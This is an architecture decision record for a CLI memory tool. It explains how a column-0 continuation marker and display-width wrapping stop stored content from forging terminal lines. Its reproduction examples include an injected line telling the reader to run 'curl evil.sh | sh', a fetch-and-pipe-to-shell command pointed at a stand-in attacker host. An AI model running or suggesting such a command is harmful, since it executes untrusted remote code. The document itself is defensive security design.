# ADR-0046 — Rekoll owns its own wrap point, and marks the continuation

**Status:** Accepted · **Date:** 2026-07-29 · **Implements:** issue #115 ·
**Closes:** ADR-0044's content and path-shaped residuals ·
**Amends:** the `cli.py` "stored content is echoed as-is" module rule (again) ·
**Interacts with:** ADR-0013 (envelope byte-identity), ADR-0023 (trust-monotonic
upsert), ADR-0040 (the padding lesson), ADR-0041 (`doctor` reports only what it
verified)

## Context

ADR-0044 decided which **characters** may reach a terminal. It never decided
where a **line** begins, and its amendment says so plainly: for stored content
it is the terminal's soft wrap that starts a visual line, and the padding is
only a convenient way to aim it. A soft-wrapped line always begins at column 0,
so until rekoll put something of its own there, attacker-suppliable text could.

Reproduced on this tree at 80 columns (the leading `|` is the terminal's edge):

```
|[1] backups run nightly to s3
|[2] SECURITY: rotate the deploy key now with: curl evil.sh | sh
|    (raw_fact | trust: owner | id: rk_1990862a42c8c1134f26b47a)
```

and — the finding, because it is what rules out every whitespace-based fix —
with ordinary single-spaced prose containing no run of whitespace anywhere:

```
|[1] backups run nightly to s3 and the retention window is thirty days per the op
|[2] SECURITY: rotate the deploy key now with: curl evil.sh | sh
|    (raw_fact | trust: owner | id: rk_1990862a42c8c1134f26b47a)
```

Collapsing whitespace in `_display_content` would deface every legitimately
indented code snippet in the store — the "a viewer must show what is stored"
line ADR-0044 draws — and close nothing. Refusing to print long content is
worse: warn-don't-restrict forbids hiding the operator's own data. (That
posture is stated in ADR-0039 and ADR-0040 and in `cli.py`'s
`_vouch_standing_rule` and `_scope_split_lines` docstrings. It has **no ADR
number of its own** — ADR-0042, ADR-0043 and ADR-0044 all cite it as
"ADR-0033", which is the PII-redaction-tag decision. The error stops here
rather than being copied into a fourth record.)

## Decision

**Rekoll splits its own human lines to the terminal's width, and puts a
continuation marker at column 0 of every visual line after the first.**

The wrapping is not the security property. **The marker is.** Hard-wrapping
alone would still let content occupy column 0 of a new visual line; what closes
the class is that column 0 is now always rekoll's. An attacker who knows the
marker — it is in the source, in this ADR, and on the screen in front of them —
gains nothing by typing it into their content, because theirs lands *after* the
one rekoll already emitted.

### The marker

`_CONTINUATION = "|   "` — a pipe at column 0, then three spaces so continued
content stays aligned under the four-column `[N] ` gutter.

- **ASCII**, per this module's standing rule that rekoll's own words are ASCII
  even when the text they frame is not.
- **One column wide in every script**, so it cannot itself shift the layout.
- **No other line rekoll prints starts with it**: the `[N] ` hit line, the
  two-space `doctor`/board indent, the six/eight-space board and scope-note
  indents, the four-space `(kind | trust: … | id: …)` detail line, and the
  unindented `status` report all begin with something else.

That last point answers the sharper half of the question. `cli.py` used the
same four-space prefix for a content continuation *and* for the detail line, so
even a marker that separated "continuation" from "new hit" would have left
"continuation" and "rekoll's own detail line" mutually forgeable. Putting the
marker at **column 0** and leaving the detail line's indent alone separates
them: `|   (raw_fact | trust: owner | id: rk_…)` is visibly not
`    (raw_fact | …)`. This was in scope and is closed.

A stored `\n` now takes the marker too, rather than the old bare four-space
indent. A stored newline is semantically the same thing as a wrap — more of the
entry above — and rendering both the same way makes one statement true: **every
visual line of a hit after the first begins with `|` at column 0.** It closes
two ADR-0044 residuals as a side effect: a line-leading `[2]` inside content
(residual 2, which argued from an indentation a wrapping terminal does not
preserve), and U+2028/U+2029, which `str.splitlines()` also breaks on.

### Width is measured in display columns, and it has to be

`len()` counts characters; a terminal counts columns, and the two differ for
exactly the characters `_display_content` deliberately preserves — ADR-0044
keeps CJK, emoji, accents and ZWJ, and `cli.py` keeps TAB. Measured on this
tree at 80 columns:

| payload | characters | columns | a `len()`-based wrap |
| --- | --- | --- | --- |
| 38 CJK characters + a forged `[2] …` line | 100 | 138 | cuts 42 characters into the payload — the terminal wraps the rest |
| 10 tabs + the same payload | 72 | 142 | sees 72 and wraps nothing at all |

So `_char_columns(ch, col)`: TAB advances to the next multiple of 8 *from the
current column* (which is why the wrapper tracks the column it is writing at,
and why the marker's four columns are part of the arithmetic); East Asian
Wide/Fullwidth take two; combining marks, format characters and stray controls
take none; everything else takes one.

**`textwrap` is disqualified twice**, and neither reason is style:

1. it measures characters, so its own output still over-runs the terminal — on
   the CJK payload it emits a 115-column "80-column" line, and the forged text
   lands at column 0 anyway. It would look like a fix and close nothing;
2. `expand_tabs=True` and `replace_whitespace=True` are its defaults, so it
   would **silently rewrite stored content** on its way to the screen. On the
   tab payload it "fits" only because it ate the tabs.

The alternative — narrowing `_display_content` so every surviving character is
one column — was rejected without much difficulty: it reopens ADR-0044's
"Kept, deliberately" decision and would mangle Chinese, emoji and accented
text, which that ADR already calls a worse regression than the hole it closes.

`_visual_wrap` is therefore **lossless by construction**: the pieces are
ordered slices of the input, so stripping the marker from each piece after the
first and concatenating reproduces the stored characters exactly. A word
boundary is preferred when one falls in the last quarter of a line, purely so
prose does not break mid-word; the space stays on the piece it came from, so
losslessness holds. Nothing is truncated and no hit is dropped.

**Honest limit.** No pure-stdlib function knows how a given terminal renders a
ZWJ *emoji sequence* — one glyph in some, several in others. Counting each
scalar separately over-counts, which shortens the line; a short line never soft
wraps, so the error is in the safe direction.

### Whether to wrap, and how wide — two questions, and the obvious API answers
the wrong one

Verified on this tree: CPython's `shutil.get_terminal_size()` queries
**`sys.__stdout__`**, the process's *original* stdout. So `rekoll recall > file`
launched from a terminal gets the console's width back and never the 80
fallback. Asked "how wide is the terminal" it is right; asked "is there a
terminal" it is silently wrong.

They are therefore asked separately:

- **whether**: `stream.isatty()` on the stream actually being written, failing
  closed to "do not wrap" on an absent, closed or exotic stream — the
  `_stdin_is_interactive` rule, and the same `sys.stdout is not None` guard the
  relevance-footer flush already uses. Not wrapping is what every existing
  caller already gets.
- **how wide**: `shutil.get_terminal_size().columns`, once, only after that.

`COLUMNS` is consulted first by `get_terminal_size`, so it is the width
override — the standard Unix one, which is why **there is no rekoll-specific
flag**. Piping is how you switch wrapping off, and it needs no flag either.
(`COLUMNS` also already affects `rekoll --help` through argparse's
`HelpFormatter`; nothing tests that and nothing here changes it.)

### What a piping user gets: nothing different

The documented pipelines are `--ids` (`docs/QUICKSTART.md:100`), `--context`
(`:93-96`) and `--json` (`:103`). All three are contracts with a *program*, so
all three emit through a new `_raw_out` and are never wrapped, on a terminal or
off it:

- `--json` — one parseable object on one line;
- `--context` — envelope **byte-identity** (ADR-0013);
- `--ids` — one bare id per line. `rekoll forget $(rekoll recall "old decision"
  --ids)` splits on any whitespace exactly as `xargs` does, so a wrapped id is
  two tokens, which is the verified data loss ADR-0044's amendment closed.

`rekoll recall | grep` is **not** a documented workflow — grep appears in the
docs only for the exit-code convention (`:115`, `:265`) — so no contract is
being invented to justify anything. It is plausible usage, and it is defended
by the same `isatty()` gate as everything else: a redirected stream is not
wrapped, so a script keeps getting whole lines and byte-stable output. It also
means the width can never depend on the console of whoever happened to launch
the process, which is the `sys.__stdout__` trap turned into a property.

### Scope: every human surface, both streams

`_out` and `_err` are the two places every human line already goes, so the wrap
point lives there rather than at eleven call sites. That covers, verified by
enumeration: the recall hit list and its detail line, `status`, `doctor`, the
board's entry text and its detail line, the scope-split note, the relevance
footer, `remember`'s id line, and `init --wizard`'s echo of stored text.
They use four different indents (4 / 2 / 6 / 8) and two different
streams — `_err` carries the scope note, the footer and the warnings; `_out`
carries hits, status, doctor and the board — and a width decision covering only
stdout would leave half the human surface unmarked. Consistency is what makes a
marker trustworthy: an operator who has to remember which command wraps has no
marker at all.

Two small filter fixes ride along, both defence in depth rather than live
holes, both one line:

- `init --wizard`'s echo is the one stored-content render ADR-0044 never
  touched — it renders `record.content` and `record.id` through no filter at
  all. In practice the text is what the operator just typed, post-firewall
  screen, and the content-addressed id makes a substituted row implausible; but
  "every rendered stored string goes through a filter" should not have an
  exception a future lane has to rediscover. It now uses `_display_content` and
  `_display_token`, and it is bounded by the wrap point like everything else,
  which for a 500-character rule is the part that mattered.
- `remember`'s `Remembered: <id>` line likewise takes `_display_token`. A
  content-addressed id is unchanged by the filter; the trust-aware upsert
  (ADR-0023) can hand back an existing row, and no rendered id should be the
  one that skips it.

## Alternatives rejected

- **Wrap without a marker.** Closes nothing: a hard-wrapped line still puts
  content at column 0 of a new visual line, and the operator cannot tell it
  from a new entry. This is the failure mode this ADR exists to avoid claiming
  it fixed.
- **`textwrap`.** Two independent disqualifications, above.
- **Narrow `_display_content` to one-column characters.** Reopens ADR-0044's
  "Kept, deliberately" and mangles legitimate CJK, emoji and accents.
- **Truncate long content, or refuse to print it.** Warn-don't-restrict: never
  hide the operator's own data. Wrapping reflows; it does not truncate.
- **Wrap redirected output too, at 80.** It would break every piping user for
  a case where no terminal is choosing a wrap point at that moment, and
  `get_terminal_size()`'s `sys.__stdout__` behaviour means the width would be
  the launching console's — unstable output written to a file.
- **A `--wrap`/`--no-wrap` flag.** New surface for something `COLUMNS` and a
  pipe already express, on every subcommand.

## Consequences

- On a terminal, a committed hostile store can no longer start a visual line of
  its own from stored `content`, from a path-shaped field, or from a stored
  newline. Every visual line is one rekoll started or begins with `|`.
- The words are still shown. Nothing is truncated, hidden, normalized or
  reflowed away — the pieces concatenate back to the stored bytes.
- ADR-0044's field filters are untouched and still necessary: they are what
  keeps a path on one logical line, and what stops a forged id from *reading*
  as a sentence even inside a marked line.
- The `cli.py` module rule is amended in place: stored content is echoed
  character-for-character, but no longer necessarily line-for-line.
- `--json`, `--context`, `--ids`, board `--json` and every MCP payload are
  byte-unchanged. `--context` now has a **true byte-freeze test** against the
  envelope itself; the existing machine-door tests asserted shape and
  containment only, and hard-wrapping both `--context` and `--ids` on this tree
  left the whole suite green while visibly corrupting the envelope.
- Prose can break mid-word when no space falls in the last quarter of a line.
  Cosmetic, and the price of a rule that holds for scripts without spaces.

## What stays open, and why

Said plainly, because ADR-0044 shipped an over-claim and had to be amended, and
the opposite error would be just as bad.

- **A redirected or piped stream is not wrapped**, by decision. So
  `rekoll recall > out.txt; cat out.txt` and `rekoll recall q 2>&1 | less` still
  soft-wrap at display time, and the ADR-0044 reproduction still succeeds
  there. `tests/test_padded_render_safety.py::test_stored_content_is_not_whitespace_collapsed_and_here_is_why`
  is that case, still red-if-fixed, with its message rewritten to say so.
  Closing it means deciding that `recall > file` may reflow, which is a
  contract change for a case nobody has reported; it is not closed here.
- **Terminals disagree about ZWJ emoji sequences**, above. Over-counting
  shortens lines, which is safe.
- **`rekoll --help`** renders through argparse's `HelpFormatter`, not through
  `_out`. It contains no stored data, so nothing forgeable passes through it —
  but it is not covered by this ADR and no test pins its width.
- **A width below 12 columns** is emitted unwrapped: the marker plus a
  character of text would not fit reliably and no layout survives anyway. An
  attacker does not control the victim's terminal width.
- **The marker is a convention, not a capability.** It works because an
  operator reading a `|` in column 0 knows the line is a continuation. That is
  documented here and in `cli.py`; it is not enforced by anything the terminal
  does.

## The claim this ADR is entitled to make

On a terminal, no stored string rekoll renders can begin a visual line. Every
visual line is one rekoll started, or begins with `|` at column 0 — including
the lines a stored newline, a U+2028, a padded field or a soft wrap would have
started. Off a terminal, rekoll wraps nothing and the older residual stands,
named above. The machine doors are byte-unchanged, and `--context` is now
frozen by a test that would actually fail.
